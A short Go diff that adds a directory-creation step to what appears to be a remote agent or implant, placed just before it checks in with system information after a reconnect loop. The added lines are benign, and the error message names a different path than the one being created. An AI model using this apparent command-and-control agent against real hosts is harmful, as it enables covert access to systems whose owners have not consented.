@@ -153,6 +153,14 @@ connect:
 		goto connect
 	}
 
+	// mkdir -p
+	if !agent.IsFileExist(agent.UtilsPath) {
+		err = os.MkdirAll(agent.UtilsPath, 0700)
+		if err != nil {
+			log.Fatalf("[-] Cannot mkdir %s: %v", agent.AgentRoot, err)
+		}
+	}
+
 	// check in with system info
 	err = agent.CheckIn()
 	if err != nil {
